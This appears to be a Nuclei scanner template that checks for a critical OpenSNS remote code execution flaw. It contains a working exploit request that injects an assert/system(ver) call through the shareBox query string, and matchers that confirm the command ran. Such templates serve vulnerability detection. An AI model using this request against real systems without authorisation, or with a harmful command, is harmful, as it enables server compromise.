id: opensns-rce1
info:
  author: gy741
  name: OpenSNS Remote Code Execution Vulnerability
  reference: '- http://www.0dayhack.net/index.php/2417/

    - https://www.pwnwiki.org/index.php?title=OpenSNS_%E9%81%A0%E7%A8%8B%E4%BB%A3%E7%A2%BC%E5%9F%B7%E8%A1%8C%E6%BC%8F%E6%B4%9E

    '
  severity: critical
  tags: opensns,rce
requests:
- matchers:
  - condition: or
    part: body
    regex:
    - ((u|g)id=)
    - Microsoft Windows
    type: regex
  - type: word
    words:
    - /Application/
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'GET /index.php?s=weibo/Share/shareBox&query=app=Common%26model=Schedule%26method=runSchedule%26id[status]=1%26id[method]=Schedule-%3E_validationFieldItem%26id[4]=function%26[6][]=%26id[0]=cmd%26id[1]=assert%26id[args]=cmd=system(ver)
    HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101
    Firefox/65.0

    Connection: close

    Accept: */*

    Accept-Language: en

    Accept-Encoding: gzip

    '
